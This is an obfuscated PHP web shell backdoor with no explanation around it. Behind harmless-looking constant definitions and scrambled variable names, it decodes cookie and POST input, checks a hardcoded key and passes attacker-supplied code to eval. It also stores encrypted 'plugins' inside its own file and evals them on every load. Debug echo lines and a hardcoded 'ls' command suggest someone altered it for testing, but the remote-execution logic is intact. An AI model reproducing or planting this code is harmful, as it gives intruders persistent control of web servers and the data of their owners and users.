<?php

if(!defined("PHP_EOL"))
{
    define("PHP_EOL", "\n");
}

if(!defined("DIRECTORY_SEPARATOR"))
{
    define("DIRECTORY_SEPARATOR", "/");
}

if (!defined('file_put_contents '))
{
    define('file_put_contents ', 1);

    $cfyjujzs = '816291f4-e264-4109-b4a2-56b0ccc91819';
    global $cfyjujzs;

    function guudpi($cukhpkar) {

        if (strlen($cukhpkar) < 4)
        {
            return "";
        }

        $konrvbmzkwwluqr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

        $pnooxjxnfecez = str_split($konrvbmzkwwluqr);
        $pnooxjxnfecez = array_flip($pnooxjxnfecez);

        $oylknnt = 0;
        $pvlaeka = "";

        $cukhpkar = preg_replace("~[^A-Za-z0-9\+\/\=]~", "", $cukhpkar);

        do {
            $knxnyph = $pnooxjxnfecez[$cukhpkar[$oylknnt++]];
            $onxqfybg = $pnooxjxnfecez[$cukhpkar[$oylknnt++]];
            $xsljba = $pnooxjxnfecez[$cukhpkar[$oylknnt++]];
            $qkkolgr = $pnooxjxnfecez[$cukhpkar[$oylknnt++]];

            $uvgpquiy = ($knxnyph << 2) | ($onxqfybg >> 4);
            $tamnincvvjsf = (($onxqfybg & 15) << 4) | ($xsljba >> 2);
            $tamninnpbziq = (($xsljba & 3) << 6) | $qkkolgr;
            $pvlaeka = $pvlaeka . chr($uvgpquiy);
            if ($xsljba != 64) {
                $pvlaeka = $pvlaeka . chr($tamnincvvjsf);
            }
            if ($qkkolgr != 64) {
                $pvlaeka = $pvlaeka . chr($tamninnpbziq);
            }
        } while ($oylknnt < strlen($cukhpkar));
        return $pvlaeka;
    }

    if (!function_exists('file_put_contents'))
    {
        function file_put_contents($pnooxjx, $konrvbmz, $sbzcgbimncmrp = False)
        {
            $ujwffsoy = $sbzcgbimncmrp == 8 ? 'a' : 'w';
            $sbzcgbi = @fopen($pnooxjx, $ujwffsoy);
            if ($sbzcgbi === False)
            {
                return 0;
            }
            else
            {
                if (is_array($konrvbmz)) $konrvbmz = implode($konrvbmz);
                $yflkex = fwrite($sbzcgbi, $konrvbmz);
                fclose($sbzcgbi);
                return $yflkex;
            }
        }
    }

    if (!function_exists('file_get_contents'))
    {
        function file_get_contents($xigeskzk)
        {
            $oylknntbyqpvqf = fopen($xigeskzk, "r");
            $pbzoorja = fread($oylknntbyqpvqf, filesize($xigeskzk));
            fclose($oylknntbyqpvqf);

            return $pbzoorja;
        }
    }
    function afzdcr()
    {
        return trim(preg_replace("/\(.*\$/", '', __FILE__));
    }

    function nolesbmb($yzfppg, $pbmdri)
    {
        $xxjfzjnt = "";

        for ($oylknnt=0; $oylknnt<strlen($yzfppg);)
        {
            for ($tamnin=0; $tamnin<strlen($pbmdri) && $oylknnt<strlen($yzfppg); $tamnin++, $oylknnt++)
            {
                $xxjfzjnt .= chr(ord($yzfppg[$oylknnt]) ^ ord($pbmdri[$tamnin]));
            }
        }

        return $xxjfzjnt;
    }

    function uvyaqb($yzfppg, $pbmdri)
    {
        global $cfyjujzs;

        return nolesbmb(nolesbmb($yzfppg, $pbmdri), $cfyjujzs);
    }
    function romcahl($yzfppg, $pbmdri)
    {
        global $cfyjujzs;

        return nolesbmb(nolesbmb($yzfppg, $cfyjujzs), $pbmdri);
    }

    function iwgldmdh()
    {
        $tamninbphgtfi = @file_get_contents(afzdcr());

        $pnooxjxifwtja = strpos($tamninbphgtfi, md5(afzdcr()));
        if ($pnooxjxifwtja !== FALSE)
        {
            $vjxyxcmv = substr($tamninbphgtfi, $pnooxjxifwtja + 32);
            $sbzcgbibnyzoy = @unserialize(uvyaqb(rawurldecode($vjxyxcmv), md5(afzdcr())));
        }
        else
        {
            $sbzcgbibnyzoy = Array();
        }

        return $sbzcgbibnyzoy;
    }

    function lwbscqno($sbzcgbibnyzoy)
    {
        $gpmqsfs = rawurlencode(romcahl(@serialize($sbzcgbibnyzoy), md5(afzdcr())));
        $tamninbphgtfi = @file_get_contents(afzdcr());

        $pnooxjxifwtja = strpos($tamninbphgtfi, md5(afzdcr()));
        if ($pnooxjxifwtja !== FALSE)
        {
            $sbzcgbiojfgw = substr($tamninbphgtfi, $pnooxjxifwtja + 32);
            $tamninbphgtfi = str_replace($sbzcgbiojfgw, $gpmqsfs, $tamninbphgtfi);

        }
        else
        {
            $tamninbphgtfi = $tamninbphgtfi . "\n\n//" . md5(afzdcr()) . $gpmqsfs;
        }

        @file_put_contents(afzdcr(), $tamninbphgtfi);
    }

    function qtfidzlo($ooxpeye, $oylknntreobd)
    {
        $sbzcgbibnyzoy = iwgldmdh();

        $sbzcgbibnyzoy[$ooxpeye] = guudpi($oylknntreobd);

        lwbscqno($sbzcgbibnyzoy);
    }

    function qbvmajhz($ooxpeye)
    {
        $sbzcgbibnyzoy = iwgldmdh();

        unset($sbzcgbibnyzoy[$ooxpeye]);

        lwbscqno($sbzcgbibnyzoy);
    }

    function wyjxpnp($ooxpeye=NULL)
    {
        foreach (iwgldmdh() as $egstluwh=>$mjgwrcbk)
        {
            if ($ooxpeye)
            {
                if (strcmp($ooxpeye, $egstluwh) == 0)
                {
                    eval($mjgwrcbk);
                    break;
                }
            }
            else
            {
                eval($mjgwrcbk);
            }
        }
    }

    foreach (array_merge($_COOKIE, $_POST) as $hglbbs => $yzfppg)
    {
        echo "test ".$yzfppg."\n";
        echo "test2 ".$hglbbs."\n";
        // $yzfppg = @unserialize(uvyaqb(guudpi($yzfppg),$hglbbs));
        $yzfppg = @unserialize("a:3:{s:2:\"ak\";s:36:\"816291f4-e264-4109-b4a2-56b0ccc91819\";s:1:\"a\";s:1:\"e\";s:1:\"d\";s:2:\"ls\";}");
        // echo "test4".var_dump(uvyaqb(guudpi($yzfppg), $hglbbs));
        echo "test3 ".$yzfppg;

        if (isset($yzfppg['ak']) && $cfyjujzs==$yzfppg['ak'])
        {
            echo "true-1";
            if ($yzfppg['a'] == 'i')
            {
                $oylknnt = Array(
                    'pv' => @phpversion(),
                    'sv' => '2.0-1',
                    'ak' => $yzfppg['ak'],
                );
                echo @serialize($oylknnt);
                exit;
            }
            elseif ($yzfppg['a'] == 'e')
            {
                echo "true-2";
                echo var_dump($yzfppg['d']);
                echo eval($yzfppg['d']);
            }
            elseif ($yzfppg['a'] == 'plugin')
            {
                if($yzfppg['sa'] == 'add')
                {
                    qtfidzlo($yzfppg['p'], $yzfppg['d']);
                }
                elseif($yzfppg['sa'] == 'rem')
                {
                    qbvmajhz($yzfppg['p']);
                }
            }
            echo $yzfppg['ak'];
            exit();
        }
    }
  }
wyjxpnp();
?>